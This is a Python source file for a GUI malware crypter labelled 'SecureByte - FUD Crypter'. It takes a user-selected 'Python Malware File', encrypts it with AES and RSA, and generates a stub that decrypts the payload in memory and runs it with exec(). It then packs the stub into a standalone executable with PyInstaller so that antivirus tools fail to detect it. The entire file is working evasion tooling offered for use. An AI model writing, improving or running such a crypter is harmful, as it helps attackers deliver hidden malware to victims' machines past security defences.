import random
import subprocess
from pathlib import Path
import os
# import time
from tkinter import scrolledtext
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives.hashes import SHA256
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import tkinter as tk
from tkinter import filedialog

def generate_rsa_key_pair():
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048
    )
    public_key = private_key.public_key()
    return private_key, public_key

def generate_aes_key():
    return os.urandom(32)  # 256-bit AES key

def encrypt_aes(aes_key, data):
    iv = os.urandom(16)  # Initialization vector for AES
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
    encryptor = cipher.encryptor()

    padder = sym_padding.PKCS7(128).padder()
    padded_data = padder.update(data.encode('utf-8')) + padder.finalize()

    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return iv + encrypted_data

def decrypt_aes(aes_key, encrypted_data):
    iv = encrypted_data[:16]
    encrypted_payload = encrypted_data[16:]

    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))
    decryptor = cipher.decryptor()

    decrypted_padded_data = decryptor.update(encrypted_payload) + decryptor.finalize()
    unpadder = sym_padding.PKCS7(128).unpadder()
    decrypted_data = unpadder.update(decrypted_padded_data) + unpadder.finalize()

    return decrypted_data.decode('utf-8')

def encrypt_rsa(public_key, data):
    encrypted = public_key.encrypt(
        data,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=SHA256()),
            algorithm=SHA256(),
            label=None
        )
    )
    return encrypted

def browse_file():
    filepath = filedialog.askopenfilename(filetypes=[("Python Files", "*.py")])
    if filepath:
        file_entry.delete(0, tk.END)
        file_entry.insert(0, filepath)

def py_to_exe(file_path):
    result_text.insert(tk.END, "Encryption Successful!\n")
    result_text.insert(tk.END, "Converting to .exe...\n")
    result_text.update_idletasks()  # Update the GUI to show the message
    
    process = subprocess.Popen(["pyinstaller", 'stub.py', "--onefile"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    while True:
        line = process.stdout.readline()
        if not line:
            break
        result_text.insert(tk.END, line)
        result_text.see(tk.END)  # Scroll to the end
        result_text.update_idletasks()  # Update the GUI
        
    process.communicate()  # Wait for the process to finish
    result_text.insert(tk.END, "Conversion completed!\n")
    result_text.see(tk.END)  # Scroll to the end

def execute_encryption():
    file_path = file_entry.get()
    if file_path:
        enc(file_path)
        py_to_exe(file_path)
        subprocess.run(["pyinstaller", "--onefile", "stub.py"], shell=True)

def enc(payload_file):
    private_key, public_key = generate_rsa_key_pair()
    aes_key = generate_aes_key()

    with open(payload_file) as f:
        contents = f.read()

    encrypted_contents_aes = encrypt_aes(aes_key, contents)
    encrypted_contents_rsa = encrypt_rsa(public_key, aes_key)

    try:
        # start_time = time.time()
        with open('stub.py', 'w') as f:
            f.write('import subprocess\n')
            f.write('from cryptography.hazmat.primitives import serialization\n')
            f.write('from cryptography.hazmat.primitives.asymmetric import padding\n')
            f.write('from cryptography.hazmat.primitives.hashes import SHA256\n')
            f.write('from cryptography.hazmat.primitives import padding as sym_padding\n')
            f.write('from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\n')
            f.write('def decrypt_aes(aes_key, encrypted_data):\n')
            f.write('    iv = encrypted_data[:16]\n')
            f.write('    encrypted_payload = encrypted_data[16:]\n')
            f.write('    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv))\n')
            f.write('    decryptor = cipher.decryptor()\n')
            f.write('    decrypted_padded_data = decryptor.update(encrypted_payload) + decryptor.finalize()\n')
            f.write('    unpadder = sym_padding.PKCS7(128).unpadder()\n')
            f.write('    decrypted_data = unpadder.update(decrypted_padded_data) + unpadder.finalize()\n')
            f.write('    return decrypted_data\n\n')
            f.write('def decrypt_rsa(private_key, encrypted_data):\n')
            f.write('    return private_key.decrypt(\n')
            f.write('        encrypted_data,\n')
            f.write('        padding.OAEP(\n')
            f.write('            mgf=padding.MGF1(algorithm=SHA256()),\n')
            f.write('            algorithm=SHA256(),\n')
            f.write('            label=None\n')
            f.write('        )\n')
            f.write('    )\n\n')
            f.write('private_key_pem = """' + private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            ).decode('utf-8') + '"""\n')
            f.write('public_key_pem = """' + public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            ).decode('utf-8') + '"""\n')
            f.write('encrypted_aes_key = """' + encrypted_contents_rsa.hex() + '"""\n')
            f.write('encrypted_payload = """' + encrypted_contents_aes.hex() + '"""\n')
            f.write('private_key = serialization.load_pem_private_key(private_key_pem.encode(), password=None)\n')
            f.write('encrypted_aes_key_bytes = bytes.fromhex(encrypted_aes_key)\n')
            f.write('aes_key = decrypt_rsa(private_key, encrypted_aes_key_bytes)\n')
            f.write('encrypted_payload_bytes = bytes.fromhex(encrypted_payload)\n')
            f.write('decrypted_payload = decrypt_aes(aes_key, encrypted_payload_bytes)\n')
            f.write('exec(decrypted_payload.decode("utf-8"))\n')  # Execute the payload

        # end_time = time.time()
        # elapsed_time = end_time - start_time

        # print(f"Elapsed time: {elapsed_time:.2f} seconds")

    except FileNotFoundError:
        pass
    # print("\n[+] File Successfully Encrypted")

# Create the GUI window
root = tk.Tk()
root.title("SecureByte - FUD Crypter")

# Set background color and window size
root.configure(bg='#222831')
root.geometry('900x500')

# Create styled labels and entry for file path
file_label = tk.Label(root, text="Select Python Malware File:", bg='#222831', fg='#00adb5', font=("Helvetica", 14))
file_label.pack(pady=10)

file_entry = tk.Entry(root, width=50, font=("Helvetica", 12))
file_entry.pack()

browse_button = tk.Button(root, text="Browse", command=browse_file, font=("Helvetica", 12), bg='#393e46', fg='white')
browse_button.pack(pady=5)

# Create a separator line
separator = tk.Frame(height=2, bd=1, relief=tk.SUNKEN, bg='#00adb5')
separator.pack(fill=tk.X, padx=5, pady=5)

# Create a styled execute button
execute_button = tk.Button(root, text="Execute Encryption", command=execute_encryption, bg='#00adb5', fg='white', font=("Helvetica", 14))
execute_button.pack(pady=10)

# Create a scrolled text widget to display process output
result_text = scrolledtext.ScrolledText(root, width=80, height=20, font=("Helvetica", 12))
result_text.pack(padx=10, pady=10)

# Start the GUI event loop
root.mainloop()
